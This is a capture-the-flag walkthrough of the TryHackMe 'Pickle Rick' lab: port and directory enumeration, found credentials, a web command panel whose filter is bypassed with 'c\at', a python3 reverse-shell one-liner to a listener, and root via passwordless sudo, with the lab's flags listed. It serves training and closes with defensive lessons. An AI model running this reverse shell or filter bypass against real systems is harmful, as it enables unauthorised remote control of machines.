<p align="center">
  THM : Pickle Rick<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/picklerick<br>
  <img src="https://i.imgur.com/3ypKR1f.png">
</p>

## Summary
- [NMAP Scan](#nmap-scan)
- [Manual Website Enumeration](#manual-website-enumeration)
- [Dirb Scan](#dirb-scan)
- [Getting a shell](#getting-a-shell)
- [Find flags](#find-flags)
- [Conclusion](#conclusion)

## NMAP Scan
Let's make an nmap scan using the following cmd ```sudo nmap -sV -A 10.10.181.166 -oN nmapresultat.txt```

```
sudo nmap -sV -A 10.10.181.166 -oN nmapResultsB.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 20:30 EST
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 32.80% done; ETC: 20:30 (0:00:02 remaining)
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 20:31 (0:00:06 remaining)
Nmap scan report for 10.10.181.166
Host is up (0.073s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e937ce4e5167a37c1ff8cd2183a347a (RSA)
|   256 49d584943eba0fde2fcbc5c9e68e2e8a (ECDSA)
|_  256 ed31f53f7f379bb5b928adbc93f48e5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=2/11%OT=22%CT=1%CU=40010%PV=Y%DS=2%DC=T%G=Y%TM=63E8415
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=104%GCD=1%ISR=109%TI=Z%CI=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O
OS:3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   72.42 ms 10.8.0.1
2   72.09 ms 10.10.181.166

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds
```

## Manual website enumeration

If we go to the index page of the website, we can see that Rick is talking about a password that he forgot.

![alt text](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/2.PNG#center)

Looking at the source code of the page, we can see that Rick left a comment containing a username.  

![alt text](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/3.PNG#center)

So now we have a username : **R1ckRul3s**

One of the first things I look for when i'm enumerating a website is the robots.txt file. So let's see if there is a robots.txt file on this web server.

![alt text](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/4.PNG#center)

And we found a strange looking strings... It's not a page of the webserver so.. Maybe the password that Rick lost ? Let's write it down for the moment. 
```Robots.txt: **Wubbalubbadubdub**```


## Gobuster Scan
Lets use gobuster to list the directories of the site

```gobuster dir -u http://10.10.181.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt -x .php,.html,.txt,.pdf```

```
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.166/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/11 20:53:12 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://10.10.181.166/assets/]
```

First I tried a simple gobuster scan but it didn't found any interesting pages, so I decided to try with the -X parameter to search for page with extensions: php,html,txt,pdf

```gobuster dir -u http://10.10.181.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt -x .php,.html,.txt,.pdf```

This time the enumuration was faster and gives more pages ! 

```
└─$ gobuster dir -u http://10.10.181.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt -x .php,.html,.txt,.pdf
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.166/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              txt,pdf,php,html
[+] Timeout:                 10s
===============================================================
2023/02/11 21:09:41 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 293]
/index.html           (Status: 200) [Size: 1062]
/.php                 (Status: 403) [Size: 292]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 315] [--> http://10.10.181.166/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
```

And we found a login.php page ! (The portal.php page redirects us to login.php)  
So let's go to this page and try to login with the informations we gathered :

![alt text](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/4.PNG#center)


Using **R1ckRul3s** as login and **Wubbalubbadubdub** as password, we are redirected to a portal.php page.  

![alt text](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/5.PNG#center)


We cannot access any pages using the menu on top of the page. All tabs redirect us to **denied.php**  with the following message:"Only the REAL rick can view this page.." 

But on the Commands tab we have an input field that seems to be used to run commands. So let's try using **whoami**.

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/6.PNG#center)

We see that we can run linux commands. So we can try to use some other commands... I tried some useful commands and , we can run ls, wget, sudo -l, and cat, but there is some filters that prevent from using some commands , like for cat.  

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/7.PNG#center)


<div style="text-align:center"><img src="https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/7.PNG" /></div>

We can easily bypass those filters by just putting a '\\' inside the command, like so : **c\at file**.  


![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/8.PNG#center)

`mr. meeseek hair`

Now we have multiple choices:  

1. I could just find the different flags using this command input, using  `sudo -l`
2. Get a reverse shell, this will be more easier for searching on the machine.

Like I said, we can use `sudo -l`  

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/9.PNG#center)

Yes... www-data can run any commands as root, without password.

But I want to get a reverse shell on the website 



## Getting a shell
Let's see if pyhton3 is installed into the machine `which python3`

![img](https://github.com/TiXADZ/Write-Ups-THM-CTFs/blob/main/images/Pickle_Rick/10.PNG#center)

After starting a listener on my machine i used an one liner python3 shell on the command panel

`nc -lnvp 4545`

```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.69.102",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'```

And i got a reverse shell which i stabilized using the following commands 

```
export TERM=xterm
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty -echo raw;fg
```
And then i did ```sudo su``` to get a shell as root.


## Find flags
Now I can get the 3 ingredients for the potion that Rick needs :  

1. What is the first ingredient Rick needs ? : **ls ==> cat Sup3rS3cretPickl3Ingred.txt**  

2. Whats the second ingredient Rick needs ? : **cd /home/rick/ ==> ls ==> cat second\ ingredients**

3. Whats the final ingredient Rick needs ? : **cd /root ==> ls ==> cat 3rd.txt**  


## Conclusion

- In this CTF, we see that it can be useful to read the source code of pages on a web server, we can find useful informations, even if there is no credentials we can find CMS versions, links to other pages...  

- Even if there is filters on command input, there is sometimes a way to bypass it, as was the case with ```cat ==> c\at```

- I also learned that it is very easy for an attacker to get a full control of the machine if the user ```www-data``` has too much permissions, i was able to do ```sudo -l``` to check that i have all permissions to do ```sudo su``` without password. So it is very important to manage permissions properly.

 ```www-data``` should not have the right to run any command as root.

 

